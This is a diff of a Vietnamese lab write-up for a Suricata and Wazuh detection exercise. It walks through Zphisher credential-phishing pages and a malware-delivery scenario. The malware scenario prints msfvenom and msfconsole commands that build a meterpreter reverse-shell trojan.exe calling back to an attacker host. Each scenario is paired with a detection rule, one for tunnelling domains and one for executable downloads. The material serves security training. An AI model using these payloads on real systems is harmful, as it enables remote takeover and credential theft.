@@ -9,8 +9,14 @@ Mục tiêu:
 - Ghi nhận các hành vi đáng ngờ và cảnh báo khi có truy cập đến các miền/phương thức tunneling thường dùng trong phishing.
   
 Dùng công cụ Zphiser để tấn công vào máy nạn nhân  
+![](Image/KB1_1.png)  
+  
 Zphiser sẽ tạo trang web giả mạo để dụ nạn nhân điền thông tin quan trọng như username, password  
-Khi nạn nhân điền xong thông tin thì sẽ được gửi qua máy nạn nhân  
+![](Image/KB1_2.png)  
+  
+Khi nạn nhân điền xong thông tin thì sẽ được gửi qua máy kẻ tấn công
+![](Image/KB1_3.png)  
+![](Image/KB1_4.png)  
   
 Rule để cảnh báo:  
 alert tls any any -> any any (msg:"[HUNTING] Phising detect"; tls_sni; content:"trycloudflare.com"; nocase; classtype:policy-violation; sid:4000002; rev:1;)  
@@ -22,8 +28,12 @@ Giải thích rule:
 - classtype:policy-violation: vi phạm chính sách (truy cập tên miền bị cấm)
   
 Phía suricata  
+![](Image/KB1_5.png)  
   
 Phía Wazuh  
+![](Image/KB1_6.png)  
+  
+![](Image/KB1_7.png)  
   
 ## Kịch bản 2: tấn công truyền mã độc
 Mục tiêu:
@@ -31,18 +41,23 @@ Mục tiêu:
 - Tạo một ứng dụng uy tín đánh lừa người dùng tải về
   
 Tạo payload trojan.exe để lừa người dùng tải xuống:  
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.2 LPORT=4444 -f exe > trojan.exe  
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.39 LPORT=4444 -f exe > trojan.exe  
 msfconsole  
 use exploit/multi/handler  
 set payload windows/x64/meterpreter/reverse_tcp  
-set LHOST 192.168.119.2 ( máy tấn công )  
+set LHOST 192.168.119.39 ( máy tấn công )  
 set LPORT 4444  
 exploit  
-
+  
+![](Image/KB2_1.png)  
+  
+![](Image/KB2_2.png)  
+  
 Mở port 80
+![](Image/KB2_3.png)  
   
 Máy nạn nhân sẽ truy cập 192.168.119.2:4444/trojan.exe → tự động tải mã độc về 
-
+![](Image/KB2_4.png)  
   
 Rule cảnh báo:  
 alert http any any -> any any (msg:"[Trojan EXE Download Detected - MZ Header]"; flow: to_client, established; file_data; content:"MZ"; depth:2; classtype:trojan-ac tivity; sid:1002005; rev:1;)  
@@ -55,8 +70,10 @@ Giải thích rule:
 - classtype:trojan-activity: hoạt động phần mềm độc hại
   
 Phía suricata  
-
+![](Image/KB2_5.png)  
+  
 Phía Wazuh
+![](Image/KB2_6.png)  
   
 ## Kịch bản 3: tấn công web
 Mục tiêu:
